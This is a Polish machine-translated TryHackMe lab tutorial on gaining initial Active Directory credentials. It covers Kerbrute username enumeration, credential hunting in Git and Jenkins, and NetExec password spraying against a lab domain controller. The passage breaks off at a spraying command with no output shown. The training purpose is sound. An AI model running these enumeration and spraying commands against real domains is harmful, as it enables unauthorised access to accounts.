---

W usłudze Active Directory (OGŁOSZENIE) w środowisku wszystko zaczyna się od tego pierwszego zestawu prawidłowych danych uwierzytelniających. Bez nich nie można enumerować, poruszać się poziomo i tym bardziej eskalować uprawnień. Proces uzyskiwania tych początkowych danych uwierzytelniających nazywamy naruszeniem.

W tej sali omówimy kilka typowych technik wykorzystywanych przez atakujących do zdobycia tego pierwszego punktu zaczepienia. Zaczynając od samego dostępu do sieci, przeanalizujemy naturalny przebieg ataku, od rozpoznania i poszukiwania danych uwierzytelniających, przez rozpylanie haseł i wymuszanie uwierzytelnienia, aż po uzyskanie prawidłowych danych uwierzytelniających w usłudze Active Directory.

## Cele edukacyjne

W tym pokoju dowiesz się:

- Zasada i metodologia naruszania bezpieczeństwa środowisk AD
- Wyliczanie prawidłowych nazw użytkowników za pomocą Kerbrute i przeprowadzanie ataków polegających na rozpylaniu haseł
- Wprowadzenie do świata wymuszonego uwierzytelniania i naruszeń opartych na wymuszeniu
- Typowe środki zaradcze chroniące przed tymi technikami naruszania bezpieczeństwa

## Wymagania wstępne

Zanim rozpoczniesz pracę w tym pokoju, powinieneś zapoznać się z następującymi informacjami:

- Podstawowa znajomość systemów operacyjnych Windows
- Umiejętność korzystania z narzędzi wiersza poleceń wPowerShelllub CMD
- Koncepcje omówione w [podstawach usługi Active Directory](https://tryhackme.com/room/winadbasics)
- Koncepcje omówione w [Podstawach systemu Windows](https://tryhackme.com/module/windows-fundamentals)
- Koncepcje omówione we [Wprowadzeniu do uwierzytelniania w usłudze AD](https://tryhackme.com/room/introtoactivedirectoryauthentication)

## Uruchamianie sieci

Zanim przejdziesz do następnego zadania, kliknij zielony przycisk **Start** pod schematem sieci. Daj sieci wystarczająco dużo czasu na uruchomienie.

Z siecią można połączyć się na dwa sposoby:

**AttackBox**

Jeśli korzystasz z internetowego AttackBoxa, połączenie z siecią zostanie nawiązane automatycznie po uruchomieniu AttackBoxa ze strony pokoju. Możesz to sprawdzić, uruchamiając polecenie `ping`dla adresu IP hosta `ROOTDC.THM.LOC`. Powinieneś również poświęcić chwilę na zanotowanie swojego  adresu IP.VPN IP. Używając  `ifconfig` lub  `ip a`, zanotuj adres IP  `tun0` karty sieciowej. To Twój adres IP i powiązany interfejs, którego powinieneś używać podczas wykonywania ataków w zadaniach.

**Inni gospodarze**

Jeśli zamierzasz użyć własnej maszyny atakującej, plik konfiguracyjny OpenVPN zostanie dla Ciebie wygenerowany po dołączeniu do pokoju. Kliknij  przycisk **„Pobierz profil VPN”** w Panelu sterowania siecią:

![](https://cdn-images.tryhackme.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1777815700610.png)

Użyj klienta OpenVPN, aby się połączyć. Ten przykład pokazano na  komputerze [z systemem Linux](https://tryhackme.com/access)  . Skorzystaj z tego przewodnika, aby połączyć się w systemie  [Windows](https://tryhackme.com/access)  lub  [macOS](https://tryhackme.com/access) .

OpenVPN

```bash
user@tryhackme:$ sudo openvpn ad-breach.ovpn
2026-05-01 15:30:18 OpenVPN 2.6.14 aarch64-apple-darwin24.2.0 [SSL (OpenSSL)] [LZO] [LZ4] [PKCS11] [MH/RECVDA] [AEAD]
2026-05-01 15:30:18 library versions: OpenSSL 3.6.1 27 Jan 2026, LZO 2.10
[....]
2026-05-01 15:30:20 /sbin/ifconfig utun4 192.168.21.2 192.168.21.2 netmask 255.255.255.0 mtu 1500 up
2026-05-01 15:30:20 /sbin/route add -net 192.168.21.0 192.168.21.2 255.255.255.0
add net 192.168.21.0: gateway 192.168.21.2
2026-05-01 15:30:20 /sbin/route add -net 192.168.11.0 192.168.21.1 255.255.255.0
add net 192.168.11.0: gateway 192.168.21.1
2026-05-01 15:30:20 Initialization Sequence Completed
```

Komunikat „Sekwencja inicjalizacji ukończona” informuje, że nawiązano połączenie z siecią.

## Konfiguracja DNS

Zanim zaczniemy, musimy upewnić się, że nasz komputer atakujący potrafi rozpoznać nazwy hostów używane w tym laboratorium. Powyższy diagram sieciowy przedstawia środowisko, w którym będziemy pracować:

|Gospodarz|Adres IP|Rola|
|---|---|---|
|ROOTDC.THM.LOC|192.168.12.100|Kontroler domeny (AD DS, DNS, Kerberos)|
|SERVER1.THM.LOC|192.168.12.51|Serwer plików (zapisywalny udział SMB)|
|WRK.THM.LOC|192.168.12.61|Stanowisko pracy pracownika|
|Serwer WWW|192.168.12.71|Usługi wewnętrzne (Gitea, Jenkins, Printer)|

Serwer WWW udostępnia trzy usługi za pośrednictwem odwrotnego serwera proxy Nginx, z których każda jest dostępna za pośrednictwem własnej nazwy hosta: `git.thm.loc`, `ci.thm.loc`i `printer.thm.loc`.

Istnieją dwa sposoby konfiguracji rozpoznawania nazw na komputerze atakującego:

**Opcja 1: Użyj kontrolera domeny jako serwera DNS (inne hosty)**

Gdy używasz własnej maszyny atakującej, kontroler domeny służy jako serwer DNS dla `thm.loc`, więc skierowanie na niego programu rozpoznającego domeny automatycznie obsługuje wszystkie wyszukiwania domen:

```shell
user@attackbox:~$ sudo systemctl disable --now systemd-resolved
user@attackbox:~$ echo "nameserver 192.168.12.100" | sudo tee /etc/resolv.conf
```

Jest to zalecane podejście, ponieważ umożliwia ono równieżDNS- oparte na wyliczeniach, takich jak wyszukiwanie rekordów SRV w Zadaniu 3. Jeśli potrzebujesz również zewnętrznego rozwiązania internetowego, dodaj drugi wiersz: `nameserver 1.1.1.1`.

**Opcja 2: Statyczne wpisy /etc/hosts (AttackBox)**

W AttackBoxie, jeśli nie chcesz zmieniać konfiguracji DNS, możesz dodać wpisy ręcznie:

```shell
user@attackbox:~$ sudo nano /etc/hosts
```

Dodaj następujące:

```shell
192.168.12.100    thm.loc
192.168.12.71     git.thm.loc ci.thm.loc printer.thm.loc192.168.12.51     SERVER1.thm.loc
```

Działa to we wszystkich ćwiczeniach praktycznych, należy jednak pamiętać, że zapytania o rekordy SRV w zadaniu 3 będą nadal musiały bezpośrednio dotyczyć adresu IP kontrolera domeny, ponieważ `/etc/hosts`nie obsługuje rekordów SRV.

Jeśli napotkasz jakiekolwiek problemy, skontaktuj się z nami na  [Discordzie(otwiera się w nowej karcie)](https://discord.com/invite/tryhackme)lub przez e-mail na adres `support@tryhackme.com`.

## Co to jest OGŁOSZENIE Naruszenie?

Zanim zaczniemy szukać danych uwierzytelniających, cofnijmy się o krok i zrozumiejmy, co tak naprawdę rozumiemy przez „naruszenie” Active Directory. Mówiąc najprościej, naruszenie Active Directory to proces uzyskiwania początkowego zestawu prawidłowych danych uwierzytelniających Active Directory podczas rozpoczynania od zera. Jest to pierwsza faza każdego łańcucha ataku na Active Directory. Bez tego pierwszego zestawu danych uwierzytelniających nie możemy enumerować domeny, poruszać się poziomo ani eskalować uprawnień.

![Naruszenie AD](https://cdn-images.tryhackme.com/user-uploads/6989b1062386d3517f652edd/room-content/6989b1062386d3517f652edd-1778578070677.png)

## Dlaczego początkowe poświadczenia są ważne

Mogłoby się wydawać, że pojedynczy zestaw danych uwierzytelniających o niskich uprawnieniach niewiele by znaczył. W końcu standardowy użytkownik domeny nie ma dostępu do poufnych serwerów ani nie może modyfikować obiektów AD. Jednak nawet najbardziej podstawowe konto domeny otwiera drzwi do znacznej ilości informacji. Po uwierzytelnieniu możemy sprawdzić w AD użytkowników, grupy, komputery, zasady grupy i relacje zaufania – informacje, które zazwyczaj są ukryte przed nieuwierzytelnionymi użytkownikami. W wielu przypadkach to wstępne wyliczenie ujawnia błędne konfiguracje i ścieżki ataku, które prowadzą aż do administratora domeny. Najtrudniejsze jest często zdobycie pierwszego punktu zaczepienia.

## Powierzchnia ataku AD

Typowe środowisko AD udostępnia szereg usług i protokołów, które mogą stać się celem ataku w fazie naruszenia bezpieczeństwa. Należą do nich:

- **SMB(TCP445):** Udostępnianie plików, drukarki i zdalna administracja. Często stanowią pierwszy cel ataków polegających na rozsyłaniu haseł i testowaniu uprawnień.
- **LDAP(TCP 389/636):** Protokół usługi katalogowej używany do wyszukiwania i zarządzania obiektami AD. Nieprawidłowo skonfigurowane urządzenia często przechowują dane uwierzytelniające LDAP, które można odzyskać.
- **HTTP/HTTPS:** Usługi internetowe, takie jak portale wewnętrzne,CI/płyta CDPlatformy i interfejsy zarządzania urządzeniami często ujawniają dane uwierzytelniające w dziennikach, stronach konfiguracyjnych lub repozytoriach kodu.
- **Kerberos(TCP/UDP88):** Główny protokół uwierzytelniania domeny. Jego mechanizm wstępnego uwierzytelniania może zostać wykorzystany do sprawdzenia, czy nazwy użytkowników istnieją w domenie.
- **DNS(TCP/UDP 53):** Służy do rozwiązywania nazw hostów w środowisku AD i może pomóc nam zidentyfikować kluczową infrastrukturę, taką jak kontrolery domeny i serwery pocztowe.

Każda z tych usług stanowi potencjalną drogę do uzyskania pierwszego zestawu danych uwierzytelniających, czy to poprzez odkrycie danych uwierzytelniających, rozsyłanie haseł, czy też ataki wymuszające.

## Pozycje startowe

Podczas prawdziwego starcia zazwyczaj znajdziesz się w jednej z dwóch pozycji wyjściowych:

- **Brak uwierzytelnienia (czarna skrzynka):** Masz dostęp do sieci, ale nie masz prawidłowych danych domenowych. To klasyczny scenariusz pierwszego dostępu. Musisz wyliczyć, spryskać lub wymusić dostęp do prawidłowego konta. Tę sytuację będziemy symulować w tym pokoju.
- **Zweryfikowane (szare pole):** Masz już prawidłowy zestaw poświadczeń o niskich uprawnieniach, być może z wcześniejszej fazy zaangażowania,phishingkampania lubOSINTOdkrycie. Stąd możesz przejść bezpośrednio do wyliczania i poszukać ścieżek eskalacji.

Niezależnie od pozycji wyjściowej, cel pozostaje ten sam: uzyskanie ważnych uprawnień AD, które pozwolą nam głębiej wniknąć w środowisko. W poniższych zadaniach omówimy kilka popularnych technik, aby to osiągnąć.

Przed rozpoczęciem jakichkolwiek aktywnych ataków na OGŁOSZENIE W środowisku, w którym działamy, musimy najpierw stworzyć wstępny obraz celu. W rzeczywistym zaangażowaniu zazwyczaj zaczyna się to od informacji wywiadowczych ze źródeł otwartych (OSINT) zbieranie informacji o organizacji i jej pracownikach z publicznie dostępnych źródeł. Cel na tym etapie jest prosty: stworzenie listy potencjalnych nazw użytkowników, które możemy zweryfikować pod kątem domeny.

## Zbieranie nazw użytkowników z OSINT

W praktyce istnieje kilka źródeł publicznych, w których można znaleźć nazwiska pracowników i formaty nazw użytkowników:

- **LinkedIn:** Profile pracowników często ujawniają pełne imiona i nazwiska, stanowiska i struktury raportowania. Narzędzia takie jak [linkedin2username(otwiera się w nowej karcie)](https://github.com/initstring/linkedin2username)może zautomatyzować proces pozyskiwania nazwisk pracowników i generowania list nazw użytkowników w popularnych formatach.
- **GitHub i GitLab** : Programiści czasami zatwierdzają kod, korzystając ze swoich firmowych adresów e-mail, ujawniając format poczty e-mail organizacji i nazwy użytkowników.
- **Naruszenia bezpieczeństwa danych publicznych:** Bazy danych naruszeń bezpieczeństwa mogą zawierać adresy e-mail z domeny docelowej, które bezpośrednio ujawniają format nazwy użytkownika.
- **Korporacyjne strony internetowe:** na stronach „O nas” i „Poznaj zespół” często można znaleźć nazwiska pracowników, które można przekształcić w potencjalne nazwy użytkowników.
- **Oferty pracy:** Ogłoszenia rekrutacyjne mogą ujawniać wewnętrzne technologie, strukturę zespołu, a nawet konwencje nazewnictwa.

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** W tym laboratoryjnym środowisku nie będziemy wykonywać prawdziwych testów OSINT. Zamiast tegolista słówPodano Ci liczbę potencjalnych nazw użytkowników. Jednak zrozumienie, skąd te listy pochodzą w świecie rzeczywistym, jest ważnym elementem tej metodologii.

## Popularne formaty nazw użytkowników

Po uzyskaniu listy nazwisk pracowników, kolejnym krokiem jest wygenerowanie potencjalnych nazw użytkowników. Organizacje zazwyczaj stosują spójną konwencję nazewnictwa dla swoich kont w usłudze Active Directory. Najpopularniejsze formaty to:

|Format|Przykład (dla Jane Smith)|
|---|---|
|`first.last`|`jane.smith`|
|`firstlast`|`janesmith`|
|`flast`|`jsmith`|
|`first.l`|`jane.s`|
|`first`|`jane`|
|`last.first`|`smith.jane`|

Kluczem jest zidentyfikowanie formatu używanego przez organizację docelową. Często nawet pojedynczy potwierdzony adres e-mail lub nazwa użytkownika z OSINT wystarcza, aby ustalić konwencję. Na tej podstawie można wygenerować pełną listę potencjalnych nazw użytkowników na podstawie zebranych nazwisk pracowników.

## Wyliczanie nazw użytkowników za pomocą Kerbrute

Ponieważ jest to laboratorium, część testów OSINT została już wykonana. Kliknij przycisk **„Pobierz pliki zadań”** w prawym górnym rogu tego zadania, aby wyświetlić listę nazw użytkowników znalezionych w wynikach wyszukiwania OSINT.

Mając pod ręką listę potencjalnych nazw użytkowników, możemy sprawdzić, które z nich faktycznie istnieją w domenie docelowej, korzystając z  [Kerbrute(otwiera się w nowej karcie)](https://github.com/ropnop/kerbrute)Kerbrute wykorzystuje mechanizm wstępnego uwierzytelniania Kerberos. Gdy wysyłamy żądanie usługi uwierzytelniania (AS-REQ) dla nazwy użytkownika, Centrum Dystrybucji Kluczy (KDC) reaguje różnie w zależności od tego, czy konto istnieje:

- Jeżeli nazwa użytkownika **nie istnieje** , KDC zwraca `KDC_ERR_C_PRINCIPAL_UNKNOWN`błąd.
- Jeżeli nazwa użytkownika **istnieje** ,KDCżąda wstępnego uwierzytelnienia, potwierdzającego ważność konta.

Jest to szczególnie przydatne, ponieważ wyliczanie nazw użytkowników za pomocąKerberos **Nie powoduje blokady kont,** nieudane żądania wstępnego uwierzytelnienia nie są liczone jako nieudane próby logowania. Generuje jednak identyfikator zdarzenia systemu Windows `4768`(żądania usługi uwierzytelniania Kerberos) na kontrolerze domeny, więc nie działa całkowicie bezgłośnie.

## Wyliczanie nazw użytkowników

Umieść listę słów z nazwą użytkownika, która została dostarczona w pliku `/root/usernames.txt`w AttackBox. Użyjmy Kerbrute'a do weryfikacji tych potencjalnych nazw użytkowników w domenie docelowej:

```shell
user@attackbox:~$ kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt
```

Przyjrzyjmy się parametrom:

- `userenum`:Moduł Kerbrute służący do wyliczania nazw użytkowników.
- `-d thm.loc`: Domena docelowa. Kerbrute używa jej jako domeny Kerberos.
- `--dc 192.168.12.100`: Adres IP kontrolera domeny, do którego mają być wysyłane żądania. W przypadku pominięcia, Kerbrute spróbuje rozwiązaćDCpoprzez rekordy DNS SRV.
- `/root/usernames.txt`:Lista potencjalnych nazw użytkowników do przetestowania.

Powinieneś zobaczyć wynik podobny do poniższego:

Terminal

```shell
user@attackbox:~$ kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (XXXXX) - XX/XX/XX - Ronnie Flathers @ropnop

2025/XX/XX 12:00:00 >  Using KDC(s):
2025/XX/XX 12:00:00 >   192.168.x.x:88

2025/XX/XX 12:00:01 >  [+] VALID USERNAME:  jane.smith@thm.loc
2025/XX/XX 12:00:01 >  [+] VALID USERNAME:  bob.taylor@thm.loc
2025/XX/XX 12:00:01 >  [+] VALID USERNAME:  admin.svc@thm.loc
[...SNIP...]
2025/XX/XX 12:00:05 >  Done! Tested XXX usernames (XX valid) in X.XXX seconds
```

Każdy wiersz oznaczony symbolem `[+] VALID USERNAME`reprezentuje potwierdzone konto domeny. Te zweryfikowane nazwy użytkowników tworzą teraz naszą listę docelową dla kolejnych zadań. Wykorzystamy je do rozpylania haseł w Zadaniu 5 i mogą one również pojawić się w danych uwierzytelniających odkrytych w Zadaniu 4.

Możesz zapisać dane wyjściowe Kerbrute'a do pliku, używając tej  `-o`flagi, aby ułatwić późniejsze przetwarzanie:

```shell
user@attackbox:~$ kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt -o valid_users.txt
```

## Wyliczanie DNS

Oprócz gromadzenia nazw użytkowników, warto przeprowadzić podstawową enumerację DNS, aby zidentyfikować kluczowe usługi w środowisku Active Directory. DNS stanowi podstawę Active Directory. Kontrolery domeny, serwery poczty i inna krytyczna infrastruktura są rejestrowane jako rekordy DNS. Oto kilka przydatnych wyszukiwań:

```shell
# Identify domain controllers via SRV records
user@attackbox:~$ nslookup -type=SRV _ldap._tcp.dc._msdcs.thm.loc 192.168.12.100

# Identify the Kerberos KDC
user@attackbox:~$ nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.12.100

# Identify mail servers
user@attackbox:~$ nslookup -type=MX thm.loc 192.168.12.100
```

Te zapytania pomagają nam zmapować środowisko, zanim rozpoczniemy aktywne ataki. Wiedza o lokalizacji kontrolerów domeny, serwerów pocztowych i innych usług daje nam jaśniejszy obraz topologii sieci.

## Odkrywanie poświadczeń w usługach eksponowanych

Jednym z najskuteczniejszych sposobów uzyskania początkowych uprawnień jest ich poszukiwanie w miejscach, w których programiści i administratorzy nieumyślnie je pozostawili. W wielu organizacjach usługi wewnętrzne, takie jak Git repozytoria,CI/płyta CDPlatformy i udostępniane pliki są słabo zabezpieczone i często zawierają dane uwierzytelniające w postaci zwykłego tekstu. Często jest to ścieżka najmniejszego oporu w fazie włamania i jest odwzorowaniem[MITRATechnika ATT&CK T1552 (Niezabezpieczone dane uwierzytelniające)(otwiera się w nowej karcie)](https://attack.mitre.org/techniques/T1552/).

## Dlaczego usługi Exposed są kopalnią złota

Deweloperzy i administratorzy regularnie pracują z danymi uwierzytelniającymi w ramach codziennych przepływów pracy, obejmujących ciągi połączeń z bazą danych, hasła do kont usług, APIKlucze i tajne dane wdrożeniowe. Pod presją szybkiego dostarczenia danych, te dane uwierzytelniające często trafiają do miejsc, w których nie powinny być przechowywane:

- Zaangażowany w repozytoria kodu źródłowego
- Wydrukowano w CI/CD dzienniki budowy
- Zapisane w plikach konfiguracyjnych na dyskach współdzielonych
- Udokumentowano na wewnętrznych wiki

Nawet gdy zespoły próbują po sobie posprzątać, często pozostają po nich ślady. Na przykład hasło usunięte z pliku konfiguracyjnego podczas ostatniego zatwierdzenia zmian nadal znajduje się w historii zatwierdzeń w Gicie.

## Poszukiwanie poświadczeń w repozytoriach Git

[Git(otwiera się w nowej karcie)](https://git-scm.com/)Repozytoria to jedno z najczęstszych miejsc, w których można znaleźć wyciekłe dane uwierzytelniające. Nawet jeśli klucz tajny został usunięty z bieżącej wersji pliku, historia wersji Gita zachowuje każdą zmianę. Oznacza to, że możemy przeszukać poprzednie zatwierdzenia w poszukiwaniu poufnych danych, które kiedyś tam były.

Gdy znajdziesz dostępne repozytorium Git, niezależnie od tego, czy jest to wewnętrzna instancja GitLab, serwer Gitea czy błędnie skonfigurowany `.git`katalog udostępniony za pośrednictwem serwera WWW, możesz poszukać go w kilku miejscach:

- **Historia zatwierdzania:** Programiści często zatwierdzają dane uwierzytelniające „tymczasowo” i usuwają je w późniejszym zatwierdzaniu. Sekret jest zapisywany w dzienniku.
- **Pliki konfiguracyjne:** Pliki takie jak `.env`, `web.config`, `appsettings.json`, `config.php`i `database.yml`często zawierają hasła do baz danych i klucze API.
- **Zakodowane na stałe tajne dane:** dane uwierzytelniające osadzone bezpośrednio w kodzie źródłowym, często pomijane w fazie rozwoju i testowania.
- **Definicje procesów CI/CD:** Pliki takie jak `Jenkinsfile`, `.gitlab-ci.yml`lub `.github/workflows/*.yml`mogą odwoływać się do poświadczeń lub ujawniać miejsce przechowywania sekretów.

Aby ręcznie przeszukać historię zatwierdzeń repozytorium, możemy użyć `git log`flagi `-p`, aby wyświetlić różnice dla każdego zatwierdzenia i przekazać je dalej `grep`w celu wyszukania słów kluczowych:

```shell
user@attackbox:~$ git log -p | grep -i "password\|secret\|token\|key\|credential"
```

Aby uzyskać bardziej szczegółowe i zautomatyzowane podejście, warto skorzystać z narzędzi takich jak [TruffleHog(otwiera się w nowej karcie)](https://github.com/trufflesecurity/trufflehog)może przeskanować całą historię zatwierdzania repozytorium w poszukiwaniu ciągów o wysokiej entropii i znanych wzorców poświadczeń:

```shell
user@attackbox:~$ trufflehog git file:///path/to/repo
```

## Uprawnienia myśliwskie w Jenkins

[Jenkins(otwiera się w nowej karcie)](https://www.jenkins.io/)to jedna z najczęściej spotykanych platform CI/CD w sieciach wewnętrznych i często stanowi kopalnię danych uwierzytelniających. Instancje Jenkinsa są często konfigurowane ze słabymi lub domyślnymi danymi uwierzytelniającymi (takimi jak `admin:admin`), a w niektórych przypadkach uwierzytelnianie nie jest w ogóle wymuszane, co umożliwia anonimowy dostęp do pulpitu nawigacyjnego, logów kompilacji i konfiguracji zadań.

Istnieje kilka miejsc, w których dane uwierzytelniające mogą wyciekaćJenkins:

- **Wyjście konsoli kompilacji:** Dzienniki kompilacji często wyświetlają zmienne środowiskowe, ciągi połączeń lub polecenia wdrożenia zawierające dane uwierzytelniające w postaci zwykłego tekstu. Nawet gdy Jenkins maskuje dane uwierzytelniające za pomocą `****`, nieprawidłowa interpolacja ciągu Groovy lub niestandardowe skrypty mogą ominąć to zabezpieczenie.
- **Konfiguracje zadań:** Konfiguracja XML dla każdego zadania ( `config.xml`) może zawierać zakodowane na stałe dane uwierzytelniające, zwłaszcza w przypadku starszych lub przekazywanych zadań.
- **Zmienne środowiskowe:** Jenkins udostępnia zmienne środowiskowe do kroków kompilacji. Jeśli zadanie wyświetla swoje środowisko (np. używając `env`lub `set`), przechowywane sekrety mogą zostać ujawnione.
- **Pliki obszaru roboczego:** obszary robocze kompilacji mogą zawierać kod źródłowy, pliki konfiguracyjne lub artefakty wdrożenia zawierające poświadczenia.

Jeśli masz dostęp do interfejsu webowego Jenkinsa, zacznij od przejrzenia historii kompilacji i odczytania danych z konsoli w poszukiwaniu ostatnich kompilacji. Możesz również uzyskać dostęp do logów kompilacji bezpośrednio przez API Jenkinsa:

```shell
user@attackbox:~$ curl http://ci.thm.loc/job/JOB_NAME/lastBuild/consoleText | grep -i "password\|secret\|token\|credential"
```

## Ćwiczenie praktyczne

W środowisku laboratoryjnym dostępne są dwie usługi, które należy zbadać:

1. **Odsłonięte repozytorium Git:** Przejrzyj repozytorium i historię zatwierdzania, aby znaleźć zatwierdzone dane uwierzytelniające. Przejdź do[http://git.thm.loc/megacorp-admin/webapp-deploy(otwiera się w nowej karcie)](http://git.thm.loc/megacorp-admin/webapp-deploy)i zobacz, czy uda ci się znaleźć jakieś hasła!
2. **Instancja Jenkinsa:** Uzyskaj dostęp do pulpitu Jenkinsa i sprawdź logi kompilacji pod kątem wycieków danych uwierzytelniających. Przejdź do [http://ci.thm.loc/(otwiera się w nowej karcie)](http://ci.thm.loc/)(zaloguj się za pomocą `admin:admin`) i zobacz, czy uda ci się zdobyć więcej!

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765215788)

**Wskazówka:** Nie zatrzymuj się na pierwszym znalezisku. Nawet jeśli znajdziesz kompletny zestaw danych uwierzytelniających (nazwę użytkownika i hasło), szukaj dalej. Możesz znaleźć dodatkowe konta, nazwy kont usług lub wzorce haseł, które przydadzą się w późniejszych zadaniach. Częściowe znalezisko, takie jak nazwa użytkownika bez hasła, nadal ma wartość. Możesz dodać je do listy haseł do rozpylania w Zadaniu 5.

## Inne źródła warte sprawdzenia

Chociaż repozytoria Git i platformy CI/CD są głównymi obszarami zainteresowania tego zadania, w środowisku korporacyjnym istnieje wiele innych miejsc, w których można znaleźć dane uwierzytelniające. Należą do nich:

- **Wewnętrzne wiki i portale dokumentacyjne:** Przewodniki wprowadzające i podręczniki często zawierają domyślne hasła lub dane uwierzytelniające konta usługi.
- **Pliki konfiguracyjne w udziałach sieciowych:** Pliki takie jak `web.config`, `bootstrap.ini`, i `unattend.xml`w dostępnychMŚPakcje mogą zawierać dane uwierzytelniające.
- **LDAPanonimowe powiązania:** niektóre kontrolery domeny zezwalają na nieuwierzytelnione zapytania LDAP, które mogą ujawniać konta użytkowników i ich atrybuty.
- **Ciągi społeczności SNMP:** Domyślne ciągi społeczności SNMP na urządzeniach sieciowych mogą ujawniać konfiguracje urządzeń zawierające dane uwierzytelniające.

Te dodatkowe źródła zostaną omówione bardziej szczegółowo w kolejnych salach. Na razie skupmy się na repozytorium Git i instancji Jenkinsa w laboratorium.

Na tym etapie powinniśmy mieć zweryfikowaną listę nazw użytkowników z zadania 3 i potencjalnie pewne częściowe informacje z zadania 4, być może domyślne hasło logowania, wzorzec nazewnictwa, a nawet kompletną parę danych uwierzytelniających. Jeśli nie uzyskaliśmy jeszcze prawidłowych danych uwierzytelniających, naszym kolejnym podejściem będzie przetestowanie powszechnie używanych haseł dla każdej potwierdzonej nazwy użytkownika. Ta technika jest znana jako „  **password spraying” (rozpylanie haseł)** .

## Rozpylanie haseł kontra siłowe łamanie haseł

Ważne jest, aby zrozumieć różnicę między atakiem siłowym a rozpylaniem haseł, ponieważ rozróżnienie to ma bezpośredni wpływ na to, czy uzyskamy wyniki, czy też zablokujemy sobie dostęp:

- **Atak brute-force** polega na próbie złamania jednego konta i złamania wielu haseł. Jest to skuteczne w przypadku słabych kont, ale prawie na pewno spowoduje uruchomienie zasad blokowania kont w przypadku…OGŁOSZENIEśrodowisko.
- **W przypadku „spryskiwania haseł”** stosuje się odwrotne podejście: sprawdzamy jedno hasło na wielu kontach, zanim przejdziemy do kolejnego. Ograniczając liczbę prób uwierzytelnienia na konto, utrzymujemy się poniżej progu blokady.

Rozpylanie haseł jest skuteczne, ponieważ pomimo egzekwowania przez organizacje wymogów dotyczących złożoności, użytkownicy mają tendencję do podążania za przewidywalnymi wzorcami. Hasła takie jak `SeasonYear!`(np. `Summer2025!`), nazwa firmy z następującą po niej cyfrą (np. `MegaCorp01!`) lub domyślne hasło przypisane podczas rejestracji są niezwykle powszechne wśród dużych populacji użytkowników.

## Zrozumienie zasad blokowania

Przed rozpoczęciem akcji rozpylania, kluczowe jest zrozumienie zasad blokowania kont w domenie docelowej. Jeśli zasady blokują konta po 5 nieudanych próbach w ciągu 30 minut, rozpylanie 3 haseł jedno po drugim to przepis na katastrofę, ponieważ zablokujesz wszystkie konta na liście.

Bezpieczne podejście jest następujące:

- Rozpylaj **jedno hasło** na całą listę użytkowników.
- Przed próbą wprowadzenia kolejnego hasła należy zaczekać, aż okno obserwacji blokady zostanie zresetowane.
- Jeśli posiadasz już jedno ważne poświadczenie z poprzedniego zadania, możesz sprawdzić politykę haseł domeny przed rozpoczęciem akcji spray. NetExec upraszcza to:

Terminal

```powershell
user@attackbox:~$ nxc smb 192.168.12.100 -u 'validuser' -p 'validpassword' --pass-pol
SMB 10.10.x.x 445 YOURDC [*] Windows Server 2022 Build 20348 x64 (name:RDC1) (domain:thm.loc) (signing:True) (SMBv1:False)
SMB 10.10.x.x 445 YOURDC [+] thm.loc\validuser:validpassword
SMB 10.10.x.x 445 YOURDC [+] Dumping password info for domain: THM
SMB 10.10.x.x 445 YOURDC Minimum password length: 8
SMB 10.10.x.x 445 YOURDC Password history length: 12
SMB 10.10.x.x 445 YOURDC Account Lockout Threshold: 5
SMB 10.10.x.x 445 YOURDC Reset Account Lockout Counter: 30
SMB 10.10.x.x 445 YOURDC Locked Account Duration: 30
SMB 10.10.x.x 445 YOURDC Password Complexity: ENABLED
SMB 10.10.x.x 445 YOURDC Minimum Password Age: 1
SMB 10.10.x.x 445 YOURDC Maximum Password Age: 42
```

W tym przykładzie próg blokady wynosi 5 prób, a licznik resetuje się po 30 minutach. Oznacza to, że możemy bezpiecznie rozpylić do 4 haseł w ciągu 30 minut bez wywoływania blokad.

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** jeśli nie masz jeszcze żadnych danych uwierzytelniających umożliwiających sprawdzenie zasad, najbezpieczniejszym podejściem jest przyjęcie konserwatywnego progu blokady i stosowanie tylko jednego hasła na raz, z dużym opóźnieniem między rundami.

## Spryskiwanie za pomocą NetExec

[NetExec(otwiera się w nowej karcie)](https://github.com/Pennyw0rth/NetExec)(nxc) to potężne narzędzie do wykorzystywania sieci i następca zarchiwizowanego już CrackMapExec. Obsługuje testowanie uwierzytelniania w wielu protokołach, w tymMŚP, LDAP, WinRM, RDP i MSSQL, co czyni je idealnym narzędziem do rozsyłania haseł.

Zanim zaczniemy rozpylać, najpierw trochę oczyścimy wynik działania Kerbrute:

```shell
grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@thm.loc//' > clean_users.txt
```

Rozpylmy jedno hasło na naszej zweryfikowanej liście nazw użytkowników przez SMB. Jeśli zapisałeś/aś swoje prawidłowe nazwy użytkowników z zadania 3 do pliku, możesz z niego skorzystać bezpośrednio:

```shell
user@attackbox:~$ nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success
```

Przyjrzyjmy się parametrom:

- `smb`:Protokół używany do uwierzytelniania. SMB (port 445) jest najczęstszym celem ataków rozpylających na kontroler domeny.
- `192.168.12.100`:Adres IP kontrolera domeny docelowej.
- `-u valid_users.txt`:Plik zawierający nazwy użytkowników do rozpylenia (jedna w każdym wierszu).
- `-p 'MegaCorp01!'`:Jedno hasło, które będzie stosowane do wszystkich nazw użytkowników.
- `--continue-on-success`Domyślnie NetExec zatrzymuje się po pierwszym pomyślnym logowaniu. Ta flaga nakazuje mu kontynuowanie testowania wszystkich nazw użytkowników, co jest niezbędne podczas testu spray, aby zidentyfikować wszystkie konta używające tego samego hasła.

Powinieneś zobaczyć wynik podobny do poniższego:

Terminal

```powershell
user@attackbox:~$ nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success
